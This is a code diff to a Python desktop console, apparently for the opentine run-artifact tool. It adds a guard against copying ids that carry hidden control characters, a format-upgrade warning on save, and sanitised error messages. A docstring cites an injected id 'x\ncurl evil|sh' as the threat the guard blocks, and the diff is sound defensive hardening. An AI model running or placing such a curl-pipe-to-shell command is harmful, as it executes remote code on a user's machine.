@@ -89,6 +89,7 @@ from opentine_gui.sources import (
     _short_oid,
     _verify_cached,
     _verify_integrity_cached,
+    artifact_format,
     open_source,
 )
 from opentine_gui.text import (
@@ -1887,17 +1888,29 @@ class OpentineGUI:
             return
         self._set_status(f"Copied {label}: {_truncate(value, 60)}")
 
+    def _copy_id(self, value: str, label: str) -> None:
+        """Copy an id only if what lands on the clipboard is what is shown.
+
+        Ids are artifact-controlled and `Run.load` accepts any string, so an id
+        like "x\ncurl evil|sh" would be displayed flattened but pasted into a
+        shell verbatim. Such an id is refused rather than silently altered.
+        """
+        if value != _oneline(value) or _sanitize(value) != value or not value.isprintable():
+            self._note("warn", f"Not copying this {label}: it contains control characters")
+            return
+        self._copy_to_clipboard(value, label)
+
     def _copy_run_id(self) -> None:
         if self._selected_run is None:
             self._set_status("Select a run first")
             return
-        self._copy_to_clipboard(str(self._selected_run.id), "run id")
+        self._copy_id(str(self._selected_run.id), "run id")
 
     def _copy_step_id(self) -> None:
         if self._selected_step is None:
             self._set_status("Select a step first")
             return
-        self._copy_to_clipboard(str(self._selected_step.id), "step id")
+        self._copy_id(str(self._selected_step.id), "step id")
 
     def _copy_run_detail(self) -> None:
         if not dpg.does_item_exist("detail_text"):
@@ -2267,17 +2280,26 @@ class OpentineGUI:
         if integrity.get("draft"):
             losses.append("its draft/autosave marker")
         dropped = _fields_a_save_would_drop(path)
+        upgrade = ""
+        on_disk = artifact_format(path)
+        if on_disk is not None and on_disk < 4:
+            # opentine 0.26+ writes format v4 on every save, so this rewrites a
+            # file older opentine releases (< 0.26) can read into one they refuse.
+            upgrade = (
+                f"This also converts it from format v{on_disk} to v4, which opentine "
+                "releases before 0.26 cannot open.\n\n"
+            )
         if dropped:
             # The artifact was written by a newer opentine than the one loaded
             # here. Its reader ignores keys it does not know, so this save would
             # write the run back without them — silently, and permanently.
             losses.append(
-                "step fields this opentine cannot read ("
+                "fields this opentine cannot read back ("
                 + ", ".join(_oneline(name) for name in dropped[:6])
                 + f", installed opentine {_OPENTINE_VERSION})"
             )
         if not losses:
-            return ""
+            return f"{upgrade}Continue?" if upgrade else ""
         return (
             # _oneline on the name: this dialog keeps its own paragraph breaks,
             # so a file called "…\n\nContinue?\n\nx.tine" writes a complete,
@@ -2285,7 +2307,7 @@ class OpentineGUI:
             f"Saving {_oneline(path.name)} will drop {' and '.join(losses)}.\n\n"
             "opentine rewrites the integrity block on every save, and this console holds "
             "no signing key; a field the installed opentine cannot read is not written "
-            "back at all.\n\nContinue?"
+            f"back at all.\n\n{upgrade}Continue?"
         )
 
     def _pause_selected(self) -> None:
@@ -2883,7 +2905,8 @@ class OpentineGUI:
                 assume_provider="" if assume == RECORDED_PROVIDER else assume,
             )
         except Exception as e:
-            self._show_panel("Price this run", str(entry.run.id), f"Pricing failed: {e}")
+            reason = _oneline(str(e))
+            self._show_panel("Price this run", str(entry.run.id), f"Pricing failed: {reason}")
             return
         self._quote = quote
         self._quote_key = entry.key
@@ -2934,7 +2957,7 @@ class OpentineGUI:
             result = stats.rollup(runs, group_by=group_by)
             body = "\n".join(stats.rollup_lines(result, limit=25))
         except Exception as e:
-            body = f"Could not summarise these runs: {e}"
+            body = f"Could not summarise these runs: {_oneline(str(e))}"
         scope = "filtered" if self._run_filter else "all"
         self._show_panel(
             "Statistics",
@@ -3005,6 +3028,7 @@ class OpentineGUI:
                     "  A field prefix switches to opentine's own grammar, the same one",
                     "  `tine ls` and `tine search` accept:",
                     "    status:failed  model:opus  tag:bug  cost:>0.01  cost:0.01..1",
+                    "    provider:anthropic  harness:claude-code",
                     "    after:2026-07-01  before:2026-08-01  text:retry",
                     "",
                     "The graph",
